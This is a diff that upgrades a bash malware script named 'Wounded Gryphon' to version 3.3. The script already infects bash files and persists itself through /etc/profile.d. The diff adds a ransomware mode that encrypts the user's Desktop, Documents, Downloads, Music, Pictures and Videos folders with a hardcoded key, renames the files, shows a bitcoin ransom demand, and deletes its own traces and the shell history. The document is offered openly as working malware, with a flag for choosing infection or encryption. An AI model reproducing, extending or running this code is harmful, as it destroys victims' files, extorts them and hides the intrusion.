@@ -12,7 +12,7 @@
 #   \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
 #    \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
 #       /   \/       \/    |__|        \/      \     \/ ---------
-#      / Wonded Gryphon v3.2  ______----------- # ---------------
+#      / Wonded Gryphon v3.3  ______----------- # ---------------
 #     #          _______,---'__,---' ---------------------------
 #            _,-'---_---__,---' -----------------------------
 #     /_ #   (,  ---____', --------------------------------
@@ -40,7 +40,11 @@ CAT=$(cat "$me")
 
 FLAG="#arrow"
 
-VERSION="v3.2"
+VERSION="v3.3"
+
+FLAG="$1"
+
+CHOOSE_BANNER
 
 # All THE BANNERS
 
@@ -138,6 +142,27 @@ function banner_text() {
    # The virus ignores non bash scripts and already infected files "
 }
 
+function error() {
+
+   echo "_______________________________ ________ __________._."
+   echo "\_   _____/\______   \______   \\_____  \\______   \ |"
+   echo " |    __)_  |       _/|       _/ /   |   \|       _/ |"
+   echo " |        \ |    |   \|    |   \/    |    \    |   \\|"
+   echo "/_______  / |____|_  /|____|_  /\_______  /____|_  /__"
+   echo "        \/         \/        \/         \/       \/ \/"
+   echo "                                                      "
+}
+
+function help() {
+
+   echo " Available opions: "
+   echo " "
+   echo " Show this page: --help"
+   echo " Infect all bash files on the system: --infect"
+   echo " Encrypt files in Desktop, Videos ...: --encrypt"
+
+# Virus mode
+
 function check() {
    
    local IFBASH=$(grep -Fx "$SHEBANG" *)
@@ -225,16 +250,176 @@ function BANNER() {
 
 # start infecting autostart
 
-BANNER # Very important :)
+function virus_start() {
+   
+   BANNER # Very important :)
 
-echo "$CAT" > /etc/profile.d/systeml.sh
+   echo "$CAT" > /etc/profile.d/systeml.sh
 
-chmod 755 /etc/profile.d/systeml.sh
+   chmod 755 /etc/profile.d/systeml.sh
 
-cd /etc/profile.d/
+   cd /etc/profile.d/
 
-check
-      
+   check
+}
+
+# RANSOMWARE MODE
+
+KEY="GrYpHoN" # KEY
+
+CCRYPT="/bin/ccrypt"
+
+function ccryptcheck() {
+   
+   if [ -f "$CCRYPT" ]
+
+   then
+      scan
+    
+   else
+      sudo apt install ccrypt -yy
+      brew install ccrypt
+      yum install ccrypt
+      pacman install ccrypt
+      ccryptcheck
+   
+   fi
+}
+
+function encryptvideos() {
+   
+   cd "$HOME"
+   cd Videos
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccencrypt "$LIST" -k "$KEY"
+   for f in *.cpt; do
+      mv -- "$f" "${f%.cpt}.WOUND"
+   done
+
+}
+
+function encryptdesktop() {
+   
+   cd "$HOME"
+   cd Desktop
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccencrypt "$LIST" -k "$KEY"
+   for f in *.cpt; do
+      mv -- "$f" "${f%.cpt}.WOUND"
+   done
+
+}
+
+function encryptpictures() {
+   
+   cd "$HOME"
+   cd Pictures
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccencrypt "$LIST" -k "$KEY"
+   for f in *.cpt; do
+      mv -- "$f" "${f%.cpt}.WOUND"
+   done
+
+}
+
+function encryptdocuments() {
+   
+   cd "$HOME"
+   cd Documents
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccencrypt "$LIST" -k "$KEY"
+   for f in *.cpt; do
+      mv -- "$f" "${f%.cpt}.WOUND"
+   done
+
+}
+
+function encryptdownloads() {
+   
+   cd "$HOME"
+   cd Downloads
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccencrypt "$LIST" -k "$KEY"
+   for f in *.cpt; do
+      mv -- "$f" "${f%.cpt}.WOUND"
+   done
+
+}
+
+function encryptmusic() {
+   
+   cd "$HOME"
+   cd Music
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccencrypt "$LIST" -k "$KEY"
+   for f in *.cpt; do
+      mv -- "$f" "${f%.cpt}.WOUND"
+   done
+
+}
+
+function cleanup() {
+   
+   echo "#!/bin/bash" > Gryphon.sh
+   echo "sleep 8" >> Gryphon.sh
+   echo "sudo mv WoundedGryphon.sh /dev/null" >> Gryphon.sh
+   chmod 755 Gryphon.sh 
+   ./Gryphon && cd "$HOME" && rm .bash_history
+   exit
+}
+
+function ransom_start() {
+   
+   BANNER
+   ccryptcheck
+   sleep 5
+   encryptdesktop
+   sleep 5
+   encryptdocuments
+   sleep 5
+   encryptdownloads
+   sleep 5
+   zenity --warning --text="Your files are encrypted by Wounded Gryphon! Pay 500$ worth in bitcoin to this bitcoin address: Your Bitcoin Address so you can receive the decrypt instructions"
+   encryptmusic
+   sleep 5
+   encryptpictures
+   sleep 5
+   encryptvideos
+   sleep 5
+   cleanup
+   
+}
+
+if [ "$FLAG" == "--infect" ]
+
+then
+   virus_start
+
+elif [ "$FLAG" == "--encrypt"]
+
+then
+   ransom_start
+
+elif [ "$FLAG" == "--help" ]
+
+then
+   help
+
+else
+   error
+   echo "   "
+   echo "No such argument available!"
+   echo "Use --help to display options" 
+
+fi
+
+
 #    |\                     /)      
 #  /\_\\__               (_//
 # |   `>\-`     _._       //`)  
